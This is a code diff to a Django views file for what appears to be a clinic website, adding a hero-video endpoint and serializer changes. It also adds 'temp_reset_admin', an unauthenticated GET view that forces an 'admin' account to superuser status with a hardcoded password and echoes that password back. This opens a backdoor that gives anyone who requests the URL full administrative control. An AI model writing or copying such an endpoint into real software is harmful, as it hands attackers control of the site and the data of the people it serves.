@@ -5,8 +5,8 @@ from django.http import HttpResponse, JsonResponse
 from django.contrib.auth import authenticate, login as auth_login
 from django.views.decorators.csrf import csrf_exempt
 import json
-from .models import Article, Service, Translation, SiteSetting, GalleryItem
-from .serializers import ArticleSerializer, ServiceSerializer, TranslationSerializer, SiteSettingSerializer, GalleryItemSerializer
+from .models import Article, Service, Translation, SiteSetting, GalleryItem, HeroVideo
+from .serializers import ArticleSerializer, ServiceSerializer, TranslationSerializer, SiteSettingSerializer, GalleryItemSerializer, HeroVideoSerializer
 from django.core.mail import send_mail
 from django.conf import settings
 
@@ -117,7 +117,7 @@ def site_settings(request):
     settings = SiteSetting.objects.first()
     if not settings:
         settings = SiteSetting.objects.create()
-    serializer = SiteSettingSerializer(settings)
+    serializer = SiteSettingSerializer(settings, context={'request': request})
     return response.Response(serializer.data)
 
 def robots_txt(request):
@@ -174,3 +174,30 @@ def api_login(request):
             return response.Response({"success": False, "error": "Invalid credentials"}, status=400)
     except Exception as e:
         return response.Response({"success": False, "error": str(e)}, status=400)
+
+
+@api_view(['GET'])
+def temp_reset_admin(request):
+    from django.contrib.auth import get_user_model
+    User = get_user_model()
+    username = 'admin'
+    password = 'adminpassword123'
+    try:
+        u = User.objects.get(username=username)
+        u.set_password(password)
+        u.is_staff = True
+        u.is_superuser = True
+        u.save()
+        return Response({"status": "success", "message": f"Updated existing user '{username}' to password '{password}' with staff/superuser privileges."})
+    except User.DoesNotExist:
+        User.objects.create_superuser(username, 'admin@drulhasorthopedic.com', password)
+        return Response({"status": "success", "message": f"Created new superuser '{username}' with password '{password}'."})
+
+
+@api_view(['GET'])
+def get_hero_video(request):
+    video = HeroVideo.objects.first()
+    if video:
+        serializer = HeroVideoSerializer(video, context={'request': request})
+        return Response(serializer.data)
+    return Response({"video": None})
